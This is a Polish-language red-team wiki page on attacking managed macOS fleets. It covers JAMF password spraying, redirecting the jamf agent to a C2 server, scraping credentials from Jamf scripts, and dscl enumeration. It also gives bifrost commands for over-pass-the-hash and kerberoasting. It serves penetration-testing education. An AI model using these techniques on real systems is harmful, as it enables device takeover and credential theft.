# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Wykorzystywanie MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Jeśli uda ci się **skompromentować dane logowania administratora** do platformy zarządzania, możesz **potencjalnie skompromitować wszystkie komputery** poprzez dystrybucję swojego złośliwego oprogramowania na maszynach.

Dla red teamingu w środowiskach MacOS zaleca się posiadanie pewnej wiedzy na temat działania MDM:

{{#ref}}
macos-mdm/
{{#endref}}

### Używanie MDM jako C2

MDM będzie miało uprawnienia do instalowania, zapytywania lub usuwania profili, instalowania aplikacji, tworzenia lokalnych kont administratorów, ustawiania hasła firmware, zmiany klucza FileVault...

Aby uruchomić własne MDM, musisz **podpisać swój CSR przez dostawcę**, co możesz spróbować uzyskać z [**https://mdmcert.download/**](https://mdmcert.download/). Aby uruchomić własne MDM dla urządzeń Apple, możesz użyć [**MicroMDM**](https://github.com/micromdm/micromdm).

Jednak aby zainstalować aplikację na zarejestrowanym urządzeniu, nadal musisz, aby była ona podpisana przez konto dewelopera... jednak po rejestracji w MDM **urządzenie dodaje certyfikat SSL MDM jako zaufane CA**, więc teraz możesz podpisać cokolwiek.

Aby zarejestrować urządzenie w MDM, musisz zainstalować plik **`mobileconfig`** jako root, który można dostarczyć za pomocą pliku **pkg** (możesz go skompresować w zip, a po pobraniu z safari zostanie on rozpakowany).

**Mythic agent Orthrus** używa tej techniki.

### Wykorzystywanie JAMF PRO

JAMF może uruchamiać **niestandardowe skrypty** (skrypty opracowane przez sysadmina), **natywne payloady** (tworzenie lokalnych kont, ustawianie hasła EFI, monitorowanie plików/procesów...) oraz **MDM** (konfiguracje urządzeń, certyfikaty urządzeń...).

#### Samo-rejestracja JAMF

Przejdź do strony takiej jak `https://<company-name>.jamfcloud.com/enroll/`, aby sprawdzić, czy mają **włączoną samo-rejestrację**. Jeśli tak, może **poprosić o dane logowania**.

Możesz użyć skryptu [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py), aby przeprowadzić atak password spraying.

Ponadto, po znalezieniu odpowiednich danych logowania, możesz być w stanie przeprowadzić brute-force na innych nazwach użytkowników za pomocą następnej formy:

![](<../../images/image (107).png>)

#### Autoryzacja urządzenia JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Binarne **`jamf`** zawierało sekret do otwarcia pęku kluczy, który w momencie odkrycia był **dzielony** wśród wszystkich i wynosił: **`jk23ucnq91jfu9aj`**.\
Ponadto, jamf **utrzymuje się** jako **LaunchDaemon** w **`/Library/LaunchAgents/com.jamf.management.agent.plist`**.

#### Przejęcie urządzenia JAMF

**JSS** (Jamf Software Server) **URL**, który **`jamf`** będzie używać, znajduje się w **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Ten plik zasadniczo zawiera URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Więc atakujący mógłby zainstalować złośliwy pakiet (`pkg`), który **nadpisuje ten plik**, ustawiając **URL do słuchacza Mythic C2 z agenta Typhon**, aby móc nadużywać JAMF jako C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### Impersonacja JAMF

Aby **podszyć się pod komunikację** między urządzeniem a JMF, potrzebujesz:

- **UUID** urządzenia: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **Zaufanej puli JAMF** z: `/Library/Application\ Support/Jamf/JAMF.keychain`, która zawiera certyfikat urządzenia

Mając te informacje, **stwórz VM** z **skradzionym** Hardware **UUID** i z **wyłączonym SIP**, umieść **zaufaną pulę JAMF,** **podłącz** agenta Jamf i skradnij jego informacje.

#### Kradzież sekretów

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Możesz również monitorować lokalizację `/Library/Application Support/Jamf/tmp/` w poszukiwaniu **niestandardowych skryptów**, które administratorzy mogą chcieć wykonać za pomocą Jamf, ponieważ są **umieszczane tutaj, wykonywane i usuwane**. Te skrypty **mogą zawierać poświadczenia**.

Jednakże, **poświadczenia** mogą być przekazywane do tych skryptów jako **parametry**, więc musisz monitorować `ps aux | grep -i jamf` (nawet nie będąc rootem).

Skrypt [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) może nasłuchiwać nowych plików dodawanych i nowych argumentów procesów.

### Zdalny dostęp do macOS

A także o **"specjalnych" protokołach** **sieciowych** **MacOS**:

{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

W niektórych przypadkach możesz stwierdzić, że **komputer MacOS jest podłączony do AD**. W tym scenariuszu powinieneś spróbować **wyliczyć** aktywny katalog, jak jesteś do tego przyzwyczajony. Znajdź trochę **pomocy** na następujących stronach:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Niektóre **lokalne narzędzia MacOS**, które mogą również pomóc, to `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Również istnieją narzędzia przygotowane dla MacOS do automatycznego enumerowania AD i zabawy z Kerberosem:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound to rozszerzenie narzędzia audytowego Bloodhound, które umożliwia zbieranie i przetwarzanie relacji Active Directory na hostach MacOS.
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost to projekt w Objective-C zaprojektowany do interakcji z API Heimdal krb5 na macOS. Celem projektu jest umożliwienie lepszego testowania bezpieczeństwa wokół Kerberosa na urządzeniach macOS przy użyciu natywnych API bez potrzeby używania innych frameworków lub pakietów na docelowym systemie.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Narzędzie JavaScript for Automation (JXA) do enumeracji Active Directory.

### Informacje o domenie
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Użytkownicy

Trzy typy użytkowników MacOS to:

- **Użytkownicy lokalni** — Zarządzani przez lokalną usługę OpenDirectory, nie są w żaden sposób połączeni z Active Directory.
- **Użytkownicy sieciowi** — Zmienni użytkownicy Active Directory, którzy wymagają połączenia z serwerem DC w celu uwierzytelnienia.
- **Użytkownicy mobilni** — Użytkownicy Active Directory z lokalnym kopią zapasową swoich poświadczeń i plików.

Lokalne informacje o użytkownikach i grupach są przechowywane w folderze _/var/db/dslocal/nodes/Default._\
Na przykład, informacje o użytkowniku o nazwie _mark_ są przechowywane w _/var/db/dslocal/nodes/Default/users/mark.plist_, a informacje o grupie _admin_ znajdują się w _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Oprócz używania krawędzi HasSession i AdminTo, **MacHound dodaje trzy nowe krawędzie** do bazy danych Bloodhound:

- **CanSSH** - podmiot dozwolony do SSH do hosta
- **CanVNC** - podmiot dozwolony do VNC do hosta
- **CanAE** - podmiot dozwolony do wykonywania skryptów AppleEvent na hoście
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Więcej informacji w [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Hasło Computer$

Uzyskaj hasła za pomocą:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Możliwe jest uzyskanie hasła **`Computer$`** w obrębie systemowego pęku kluczy.

### Over-Pass-The-Hash

Uzyskaj TGT dla konkretnego użytkownika i usługi:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Gdy TGT zostanie zebrany, możliwe jest wstrzyknięcie go w bieżącą sesję za pomocą:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Z uzyskanymi biletami serwisowymi możliwe jest próbowanie dostępu do udostępnionych zasobów na innych komputerach:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Uzyskiwanie dostępu do Keychain

Keychain prawdopodobnie zawiera wrażliwe informacje, które, jeśli zostaną uzyskane bez generowania monitu, mogą pomóc w przeprowadzeniu ćwiczenia red team:

{{#ref}}
macos-keychain.md
{{#endref}}

## Usługi zewnętrzne

MacOS Red Teaming różni się od standardowego Windows Red Teaming, ponieważ zazwyczaj **MacOS jest zintegrowany z kilkoma zewnętrznymi platformami bezpośrednio**. Typowa konfiguracja MacOS polega na uzyskiwaniu dostępu do komputera za pomocą **zsynchronizowanych poświadczeń OneLogin oraz dostępu do kilku zewnętrznych usług** (takich jak github, aws...) za pośrednictwem OneLogin.

## Różne techniki Red Team

### Safari

Gdy plik jest pobierany w Safari, jeśli jest to plik "bezpieczny", zostanie **automatycznie otwarty**. Na przykład, jeśli **pobierzesz zip**, zostanie on automatycznie rozpakowany:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Odniesienia

- [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
- [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
